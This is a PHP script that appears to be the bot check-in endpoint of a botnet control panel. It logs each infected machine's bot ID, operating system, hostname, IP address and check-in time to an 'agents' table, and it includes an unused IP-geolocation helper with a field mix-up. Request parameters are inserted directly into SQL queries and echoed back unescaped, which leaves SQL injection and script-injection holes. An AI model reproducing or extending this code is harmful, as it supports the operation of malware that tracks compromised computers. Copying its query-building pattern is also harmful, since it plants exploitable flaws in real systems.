<?php
	
	include "db.php";
	function updateGeos($ip,$time){
		$request = "http://ip-api.com/json/".$ip;
		$json = file_get_contents($request);
		$obj = json_decode($json);
		$asInfo = $obj->{'as'};
		$city = $obj->{'city'};
		$country = $obj->{'country'};
		$countryCode = $obj->{'countryCode'};
		$jsp = $obj->{'isp'};
		$lat = $obj->{'lat'};
		$lon = $obj->{'lon'};
		$lon = $obj->{'org'};
		$query = $obj->{'query'};
		$region = $obj->{'region'};
		$regionName = $obj->{'regionName'};
		$status = $obj->{'status'};
		$timezone = $obj->{'timezone'};
		$zip = $obj->{'zip'};
	}
	$bot_id = "";
	$os = "";
	$hostname = "";
	$time = "";
	$bot_exist = 1;
	$ip = $_SERVER['REMOTE_ADDR'];
	if (isset($_GET["bot_id"])){
		$bot_id = $_GET["bot_id"];
		echo $bot_id."<br>";
	}else{
		echo "bot_id not exist";
	}
	if (isset($_GET["os"])){
		$os = $_GET["os"];
		echo $os."<br>";
	}else{
		echo "os not exist";
	}
	if (isset($_GET["hostname"])){
		$hostname = $_GET["hostname"];
		echo $hostname."<br>";
	}else{
		echo "hostname not exist";
	}
	if (isset($_GET["time"])){
		$time = $_GET["time"];
		echo $time."<br>";
	}else{
		echo "time not exist";
	}
	$sql = "SELECT count(*) FROM `agents` WHERE `bot_id`='".$bot_id."' ";
	$result = $conn->query($sql);
	if ($result->num_rows > 0){
		while($row = $result->fetch_row()){
			if($row[0] == 0) $bot_exist = 0;
			break;
		}
	}
	if($bot_exist == 0){
		$sql = "INSERT INTO `agents` (`bot_id`,`os`,`hostname`,`ip`,`first_time`,`last_time`) VALUES
					('$bot_id','$os','$hostname','$ip','$time','$time')";
	}else{
		$sql = "UPDATE `agents` SET `ip`='$ip',`last_time`='$time' WHERE `bot_id`='$bot_id' ";
	}
	$result = $conn->query($sql);
	/*
	if(!$result){
		echo "Connection failed: " . mysqli_error($conn);
	}
	*/
	$conn->close();
?>